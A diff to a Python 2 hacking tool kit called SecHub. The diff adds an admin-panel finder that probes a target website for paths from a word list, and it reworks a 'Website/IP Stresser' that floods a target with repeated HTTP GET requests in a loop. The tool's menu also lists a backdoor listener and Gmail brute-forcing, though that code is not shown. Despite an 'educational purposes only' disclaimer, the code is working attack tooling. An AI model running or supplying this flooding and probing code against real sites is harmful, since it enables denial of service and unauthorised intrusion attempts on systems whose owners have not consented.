@@ -1,24 +1,27 @@
 '''
-						Welcome to SecHub.
-						------------------
-  SecHub is an Open Source Security Tool Kit developed for Pen-Testers,
+				Welcome to SecHub
+				------------------
+	SecHub is an Open Source Security Tool Kit developed for Pen-Testers,
 Hackers, and Security Reasearches. This tool was developed by Josh,
 (Yeh, just Josh).
 
-  This peice of Software is meant to be used for educational purposes only.
+	This peice of Software is meant to be used for educational purposes only.
 SecHub is simply ethical and should be used simply good, not for bad. The Developer
 of this product is not to be held responsible for misuse of this tool.
 
-  Finally, SecHub is in it's early stages of development, so please report 
+	Finally, SecHub is in it's early stages of development, so please report 
 any bugs to the gitHub Repository. Now go Hack The Planet!
+												    
 
 -SecHub Developer,
-
+												      
+												      
 Josh
-
- 
+												       
 '''
 
+##Libraries and Modules##
+##---------------------##
 
 import os
 import sys
@@ -27,6 +30,7 @@ import subprocess
 
 from termcolor import colored, cprint
 from datetime import datetime
+from urllib2 import  Request, urlopen, URLError, HTTPError
 
 import time
 import hashlib
@@ -48,7 +52,7 @@ def secHub():
 		 		 Open Source Security Kit 
 				     Version :: 1.05
 
-				     Developed By Josh
+				    Developed By Josh
 	                                                            
 	                                                            
 		
@@ -68,7 +72,7 @@ def PlatformCheck():
 		cprint("\t[+] Unix/Linux Kernel Detected...\n", 'green')  ##Nothing Beats Linux!
 
 PlatformCheck()
-time.sleep(0.5)
+time.sleep(1)
 	
 def sockListen():
 	global host
@@ -205,13 +209,12 @@ def UnleashTheBeast():
 		cprint("\t[*] Flooding " + ip + " with " + troll_input + " Packets." , 'green')
 		s.send("\tGET /" + troll_input + " HTTP/1.1\r\n")
 		s.send("\tHOST: " + beast_input + "\r\n\r\n");
-	
+		s.close()
 		
 		
 		
 	except socket.error as msg:
-		print("\t" + str(msg))
-		s.close()
+		print(str(msg))
 
 	except KeyboardInterrupt:
 		cprint("\n\t[!] User Aborted Flooding!", 'red')
@@ -298,10 +301,43 @@ def portScan():
 	cprint('\n\t[+]Scanning Complete' + total, 'blue')
 
 
+def adminPanelFinder():
+
+	f = open("link.txt", 'r')
+	os.system('clear')
+
+	link = raw_input(colored("\t(*) Enter Target Website: ", 'blue'))
+	cprint("\t\n[*] Availible Panels: \n\n", 'yellow')
+
+	while True:
+		sub_link = f.readline()
+		if not sub_link:
+			break
+
+		req_link = "http://"+link+"/"+sub_link
+		req = Request(req_link)
+
+		try:
+			response = urlopen(req)
+
+		except HTTPError as e:
+			continue
+
+		except URLError as w:
+			continue
+
+		except KeyboardInterrupt:
+			cprint("\t\n[-] User Aborted Process!", 'red')
+			sys.exit(0)
+
+		else:
+			cprint("\t[+] Success => " + req_link, 'green')
+
+
 def Options():
 
 	cprint("\t1: Listener and Backdoor\n\t2: Scan Network With Nmap\n\t3: Website/IP Stresser\n\t"
-		"4: MD5 Hashing\n\t5: Gmail BruteForce\n\t6: Port Scanner\n\t7: Clear Screen\n\t8: Exit", 'blue')
+		"4: MD5 Hashing\n\t5: Gmail BruteForce\n\t6: Port Scanner\n\t7: Website Admin Panel Finder\n\t8: Exit", 'blue')
 
 
 	
@@ -331,7 +367,6 @@ def main():
 	if start_script_input == '3':
 		global beast_input
 		global troll_input
-
 		os.system('clear')
 
 		beast_input = raw_input(colored("\t() Enter IP/Website To Flood: ", 'blue'))
@@ -346,18 +381,7 @@ def main():
 		time.sleep(1)
 
 		for x in range(1, 1000):
-				try:
-					UnleashTheBeast()
-
-				except socket.error as n:
-					print("\t" + str(n))
-					break
-					s.close()
-
-				except KeyboardInterrupt:
-					cprint("\n[-] User Aborted! ", 'red')
-					sys.exit()
-
+			UnleashTheBeast()
 				
 	if start_script_input == '4':
 		os.system('clear')
@@ -386,7 +410,7 @@ def main():
 		portScan()
 			
 	if start_script_input == '7':
-		os.system('clear')
+		adminPanelFinder() 
 
 	if start_script_input == '8':
 		sys.exit(0)
